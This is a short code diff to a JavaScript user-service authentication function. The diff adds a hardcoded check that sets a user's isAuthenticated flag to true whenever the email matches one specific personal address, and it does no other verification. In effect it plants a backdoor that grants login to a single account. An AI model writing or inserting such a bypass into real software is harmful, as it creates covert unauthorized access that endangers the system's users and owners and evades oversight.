@@ -12,6 +12,10 @@ function userService() {
             }
         };
 
+        if (email === "alexdefaro@gmail.com") {
+            authenticationData.userInformation.isAuthenticated = true;
+        }
+
         return authenticationData; 
     }
 
